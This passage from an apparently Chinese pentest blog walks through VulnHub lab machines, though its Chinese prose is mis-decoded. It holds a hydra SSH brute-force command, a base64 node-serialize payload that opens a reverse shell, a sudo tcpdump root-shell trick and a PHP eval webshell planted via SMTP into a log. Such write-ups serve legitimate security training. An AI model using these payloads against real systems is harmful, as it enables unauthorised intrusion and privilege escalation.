class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2018-04-23: I&#x27;ve been messing with that struts stuff, and it&#x27;s pretty cool! I think it might be neat</span><br><span class="line">to host that on this server too. Haven&#x27;t made any real web apps yet, but I have tried that example</span><br><span class="line">you get to show off how it works (and it&#x27;s the REST version of the example!). Oh, and right now I&#x27;m </span><br><span class="line">using version 2.5.12, because other versions were giving me trouble. -K</span><br><span class="line"></span><br><span class="line">2018-04-22: SMB has been configured. -K</span><br><span class="line"></span><br><span class="line">2018-04-21: I got Apache set up. Will put in our content later. -J</span><br></pre></td></tr></table></figure><p>j.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">For J:</span><br><span class="line"></span><br><span class="line">I&#x27;ve been auditing the contents of /etc/shadow to make sure we don&#x27;t have any weak credentials,</span><br><span class="line">and I was able to crack your hash really easily. You know our password policy, so please follow</span><br><span class="line">it? Change that password ASAP.</span><br><span class="line"></span><br><span class="line">-K</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œå­¦åˆ°ä¸€ç§æ–°çš„æ¢æµ‹æ–¹æ³•enum4linux <a href="/images/2018/10/2018-10-03-22-49-32å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-22-49-32å±å¹•æˆªå›¾-300x132.png" /></a> ç„¶åæšä¸¾å‡ºusername <a href="/images/2018/10/2018-10-03-22-50-54å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-22-50-54å±å¹•æˆªå›¾-300x100.png" /></a> åˆå¼€äº†22ç«¯å£,hydraè¯•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f 192.168.1.106 ssh</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-03-23-32-09å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-23-32-09å±å¹•æˆªå›¾-300x140.png" /></a></p><h2 id="ææƒ-1">ææƒ</h2><h3 id="å®˜æ–¹è§£">å®˜æ–¹è§£</h3><p>é¦–å…ˆç™»å½•è¿›å»,å‘ç°è¿˜æœ‰ä¸€ä¸ªkayç”¨æˆ· <a href="/images/2018/10/2018-10-04-00-48-56å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-00-48-56å±å¹•æˆªå›¾-300x207.png" /></a> ç„¶åæˆ‘ä»¬å»kayç”¨æˆ·ç›®å½•çœ‹ä¸‹ <a href="/images/2018/10/2018-10-04-00-49-40å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-00-49-40å±å¹•æˆªå›¾-300x140.png" /></a> å‘ç°.ssh,å»çœ‹ä¸€ä¸‹,å‘ç°authorized_keysåé¢æœ‰ä¸€å¥è¯ <a href="/images/2018/10/2018-10-04-00-51-05å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-00-51-05å±å¹•æˆªå›¾-300x51.png" /></a> å°è¯•ç§é’¥ç™»å½•,ä½†æ˜¯å¤±è´¥äº†,è¦æ±‚è¾“å…¥passphrase æ‰€ä»¥å°è¯•è§£pass å¤åˆ¶ä¸€ä»½ç§é’¥ä¸ºid_rsa,ç„¶åssh2johnç”¨johnæ¥ç ´è§£,ç„¶åæˆ‘è¿™é‡Œç ´è§£è¿‡ä¸€æ¬¡,å°±ç›´æ¥--showäº† <a href="/images/2018/10/2018-10-04-00-57-51å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-00-57-51å±å¹•æˆªå›¾-300x66.png" /></a> ç™»å½•æˆåŠŸ <a href="/images/2018/10/2018-10-04-01-04-11å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-04-11å±å¹•æˆªå›¾-300x184.png" /></a> ç„¶åkayç›®å½•å‘ç°å¤‡ä»½å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kay@basic2:~$ <span class="built_in">cat</span> pass.bak </span><br><span class="line">heresareallystrongpasswordthatfollowsthepasswordpolicy$$</span><br></pre></td></tr></table></figure><p>å°è¯•ä¸€ä¸‹sudo -l</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kay@basic2:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> kay on basic2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User kay may run the following commands on basic2:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±ç›´æ¥<code>sudo bash</code>å°±å¥½ <a href="/images/2018/10/2018-10-04-01-07-35å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-07-35å±å¹•æˆªå›¾-300x129.png" /></a></p><h3 id="ä¸çŸ¥é“æ˜¯ä¸æ˜¯å®˜æ–¹è§£">ä¸çŸ¥é“æ˜¯ä¸æ˜¯å®˜æ–¹è§£</h3><p>suidææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">jan@basic2:/home/kay/.ssh$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°äº†vim.basic,æ›¿æ¢shadowå¯†ç å°±å¥½ <a href="/images/2018/10/2018-10-04-01-25-36å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-25-36å±å¹•æˆªå›¾-285x300.png" /></a> ç„¶åç›´æ¥su rootå°±å¥½ <a href="/images/2018/10/2018-10-04-01-26-16å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-26-16å±å¹•æˆªå›¾-300x122.png" /></a></p><h2 id="å¼¯è·¯">å¼¯è·¯</h2><p>çœ‹äº†8080çš„manageré¡µé¢msfçˆ†äº†ä¸€æ³¢å¯†ç ,å¹¶æ²¡æœ‰ç»“æœ çœ‹åˆ°80ç«¯å£å†™çš„struts2.5.12å’ŒREST,ç„¶åsearchsploitæ‰¾åˆ°äº†æ¼æ´,ä½†æ˜¯å¹¶æ²¡æœ‰æ”»å‡»æˆåŠŸ... æ€è·¯è¿˜æ˜¯å¼€é˜”ç‚¹å§...</p><h2 id="åç»­">åç»­</h2><p>çœ‹äº†ä¸‹tomcatçš„ç›®å½•,è¿˜çœŸçš„æœ‰struts2-restçš„ç›®å½•...ä¸è¿‡å½“æ—¶æ²¡æ‰¾åˆ°...msfä¸€æ³¢å¸¦èµ°äº†... <a href="/images/2018/10/2018-10-04-01-48-35å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-48-35å±å¹•æˆªå›¾-300x120.png" /></a> ç„¶åmanageræ¨¡å—çš„å¯†ç  <a href="/images/2018/10/2018-10-04-01-53-38å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-01-53-38å±å¹•æˆªå›¾-300x80.png" /></a> çŒœä¸å‡ºæ¥å¾ˆæ­£å¸¸...</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(temple of doom,toppo)</title>
      <link href="/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"/>
      <url>/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/</url>
      
        <content type="html"><![CDATA[<h1 id="temple-of-doom">temple of doom</h1><h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/" title="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a></p><h2 id="ipç«¯å£">ipç«¯å£</h2><p>é¶æœºip:192.168.1.102 ç«¯å£æƒ…å†µ: <a href="/images/2018/10/2018-10-02-14-36-53å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-14-36-53å±å¹•æˆªå›¾-300x118.png" /></a></p><h2 id="getshell">getshell</h2><p>é¦–å…ˆå»666ç«¯å£çœ‹ä¸€ä¸‹,å‘ç°under construction åˆ·æ–°ä¸€ä¸‹å¾—åˆ°æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Unexpected token F in JSON at position 79</span><br><span class="line">    at JSON.parse (&lt;anonymous&gt;)</span><br><span class="line">    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)</span><br><span class="line">    at /home/nodeadmin/.web/server.js:12:29</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°é‡ç‚¹unserialize,å»æœä¸€ä¸‹nodejsçš„ååºåˆ—åŒ–æ¼æ´ æ‰¾åˆ°æ–‡ç« <a href="https://paper.seebug.org/213/" title="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a> æŒ‰é‡Œé¢çš„æ“ä½œç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDQ5LDQ2LDQ5LDQ4LDUzLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDU0LDU1LDQ5LDUwLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQp9KCkifQ==</span><br></pre></td></tr></table></figure><p>æ”¹cookieæ‹¿åˆ°shell <a href="/images/2018/10/2018-10-02-14-46-46å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-14-46-46å±å¹•æˆªå›¾-300x33.png" /></a></p><h2 id="ææƒ">ææƒ</h2><p>ä¼ äº†æ¢æµ‹è„šæœ¬,ä½†æ˜¯å¹¶æ²¡æœ‰expæœ‰ç”¨,å¡åœ¨è¿™é‡Œäº† çœ‹äº†ä¸€ä¸‹wp,å‘ç°ææƒå…¶å®æœ‰ç‚¹å¤æ‚.. é¦–å…ˆåœ¨ç”¨æˆ·ç›®å½•å‘ç°ç”¨æˆ·fireman æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹,å‘ç°firemanè°ƒç”¨äº†ssmanager</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nodeadmin@localhost home]$ ps -aux  grep fireman</span><br><span class="line">ps -aux  grep fireman</span><br><span class="line">root       797  0.0  0.4 301464  4316 ?        S    02:26   0:00 su fireman -c /usr/local/bin/ss-manager</span><br><span class="line">fireman    808  0.0  0.3  37060  3736 ?        Ss   02:26   0:00 /usr/local/bin/ss-manager</span><br><span class="line">nodeadm+  1128  0.0  0.1 213788  1040 pts/0    S+   02:50   0:00 grep --color=auto fireman</span><br></pre></td></tr></table></figure><p>searchsploitä¸€ä¸‹,å‘ç°exp <a href="/images/2018/10/2018-10-02-14-57-39å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-14-57-39å±å¹•æˆªå›¾-300x58.png" /></a> çœ‹ä¸€ä¸‹,å‘ç°è¦å¼€8839ç«¯å£,netstatä¸€ä¸‹,å‘ç°å¼€äº†8839çš„udp <a href="/images/2018/10/2018-10-02-14-59-59å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-14-59-59å±å¹•æˆªå›¾-300x187.png" /></a> è·‘ä¸€ä¸‹ <a href="/images/2018/10/2018-10-02-15-02-11å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-02-11å±å¹•æˆªå›¾-300x48.png" /></a> æ‹¿åˆ°shell <a href="/images/2018/10/2018-10-02-15-03-10å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-03-10å±å¹•æˆªå›¾-300x186.png" /></a> sudo -lå‘ç°tcpdumpå¯ä»¥sudoæ‰§è¡Œ åˆ©ç”¨sudoæ‰§è¡Œåå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -G 1 -w /dev/null -G 1 -W 1 -z ./1.sh -Z root</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell <a href="/images/2018/10/2018-10-02-15-10-52å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-10-52å±å¹•æˆªå›¾-300x166.png" /></a></p><h1 id="toppo">toppo</h1><p>è¿™ä¸ªå¤ªç®€å•äº†ç‚¹...</p><h2 id="ä»‹ç»-1">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/toppo-1,245/" title="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><h2 id="ipå’Œç«¯å£">ipå’Œç«¯å£</h2><p>ip:192.168.1.103 ç«¯å£ä¿¡æ¯ <a href="/images/2018/10/2018-10-02-15-52-33å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-52-33å±å¹•æˆªå›¾-300x83.png" /></a></p><h2 id="getshell-1">getshell</h2><p>å»80ç«¯å£çœ‹ä¸‹ <a href="/images/2018/10/2018-10-02-15-53-10å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-53-10å±å¹•æˆªå›¾-300x146.png" /></a> ç®€å•æµ‹è¯•ä¸€ä¸‹,å‘ç°è›®å¤šhtmlé¡µé¢,dirbä¸€ä¸‹,å‘ç°adminç›®å½• <a href="/images/2018/10/2018-10-02-15-53-55å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-53-55å±å¹•æˆªå›¾-300x128.png" /></a> è¿›å»å‘ç°å¯ä»¥åˆ—ç›®å½• <a href="/images/2018/10/2018-10-02-15-54-33å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-54-33å±å¹•æˆªå›¾-300x120.png" /></a> æ‹¿åˆ°ä¸€ä¸ªå¯†ç ,12345ted123 å°è¯•sshç™»å½•,ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·å,çŒœä¸€ä¸‹ted <a href="/images/2018/10/2018-10-02-15-55-39å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-55-39å±å¹•æˆªå›¾-300x98.png" /></a></p><h2 id="ææƒ-1">ææƒ</h2><p>ææƒçš„æ–¹æ³•å¥½åƒè¿˜è›®å¤šçš„... æŸ¥çœ‹sudoer <a href="/images/2018/10/2018-10-02-15-59-07å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-15-59-07å±å¹•æˆªå›¾-300x181.png" /></a> æˆ–è€…suidææƒ <a href="/images/2018/10/2018-10-02-16-01-18å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-02-16-01-18å±å¹•æˆªå›¾-300x245.png" /></a> æƒ³æ”¹rootå¯†ç çš„è¯å¯ä»¥è¯»ä¸€ä¸‹shadow,ç„¶åjohnè§£ä¸€ä¸‹ è§£å‡ºæ¥å¯†ç test123 ç™»å½•æ‹¿åˆ°root</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(wintermute)</title>
      <link href="/2018/10/01/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fwintermute/"/>
      <url>/2018/10/01/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fwintermute/</url>
      
        <content type="html"><![CDATA[<p>æŒºæœ‰æ„æ€çš„ä¸€ä¸ªé¶æœºç¯å¢ƒ,å­¦åˆ°ä¸å°‘ä¸œè¥¿,è®°å½•ä¸€ä¸‹ å‚è€ƒwp:<a href="https://hackso.me/wintermute-1-walkthrough/" title="https://hackso.me/wintermute-1-walkthrough/">https://hackso.me/wintermute-1-walkthrough/</a></p><h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/wintermute-1,239/" title="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a> æ³¨æ„,è¿™é‡Œç¯å¢ƒæ­å»ºå¦‚ä¸‹å›¾ <a href="/images/2018/10/2018-10-01-02-32-09å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-32-09å±å¹•æˆªå›¾.png" /></a> å³æˆ‘ä»¬çš„kaliä¸»æœºåªèƒ½è®¿é—®straylighté¶æœº,è€ŒNeuromanceré¶æœºå¤„åœ¨å†…ç½‘,éœ€è¦æˆ‘ä»¬åˆ©ç”¨straylightä½œä¸ºè·³æ¿è¿›è¡Œæ”»å‡»</p><h2 id="straylight">Straylight</h2><h3 id="ipå’Œç«¯å£">ipå’Œç«¯å£</h3><p>é¶æœºip:192.168.1.101 ç«¯å£æ‰«ææƒ…å†µ <a href="/images/2018/10/2018-10-01-02-35-03å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-35-03å±å¹•æˆªå›¾.png" /></a></p><h3 id="æ¢æµ‹å’Œæ‹¿shell">æ¢æµ‹å’Œæ‹¿shell</h3><p>åˆ°80ç«¯å£,å‘ç°å°±ä¸€ä¸ªé™æ€é¡µé¢ç»™å‡ºèƒŒæ™¯,æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯,åˆ°3000ç«¯å£çœ‹ä¸‹,å‘ç°ä¸€ä¸ªç™»å½•é¡µé¢,ç›´æ¥admin/adminä¸€æ³¢æˆåŠŸç™»å½•,å‘ç°æ˜¯ntopçš„ç®¡ç†é¡µé¢ <a href="/images/2018/10/2018-10-01-02-38-05å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-38-05å±å¹•æˆªå›¾.png" /></a> æ¢æµ‹ä¸€ä¸‹æµé‡,å‘ç°æœ‰å¥‡æ€ªçš„æµé‡ <a href="/images/2018/10/2018-10-01-02-39-25å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-39-25å±å¹•æˆªå›¾.png" /></a> åˆ°/turing-boloçœ‹ä¸‹,ç„¶ååœ¨caseé¡µé¢å‘ç° <a href="/images/2018/10/2018-10-01-02-40-46å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-40-46å±å¹•æˆªå›¾.png" /></a> è®¿é—®ä¸€ä¸‹,å‘ç°å†…å®¹ç›¸åŒ,çŒœæµ‹æœ‰æ–‡ä»¶åŒ…å« <a href="/images/2018/10/2018-10-01-02-42-31å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-42-31å±å¹•æˆªå›¾.png" /></a> æƒ³åˆ°å‰é¢å¼€äº†25ç«¯å£,åŒ…å«ä¸€ä¸‹mail.logè¯•è¯•çœ‹ <a href="/images/2018/10/2018-10-01-02-44-00å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-44-00å±å¹•æˆªå›¾.png" /></a> å‘ç°æˆåŠŸåŒ…å«,é‚£ä¹ˆæˆ‘ä»¬å»å†™æ—¥å¿—å°±å¥½,è¿25ç«¯å£ ç„¶åå‘é€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep<span class="comment">#  nc 192.168.1.101 25</span></span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">MAILFROM:&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);phpinfo();?&gt;</span><br><span class="line">221 2.7.0 Error: I can <span class="built_in">break</span> rules, too. Goodbye.</span><br></pre></td></tr></table></figure><p>å‘ç°ä»£ç å¾—åˆ°æ‰§è¡Œ <a href="/images/2018/10/2018-10-01-02-49-57å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-49-57å±å¹•æˆªå›¾.png" /></a> èšå‰‘è¿ä¸€ä¸‹ <a href="/images/2018/10/2018-10-01-02-54-57å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-02-54-57å±å¹•æˆªå›¾.png" /></a></p><h3 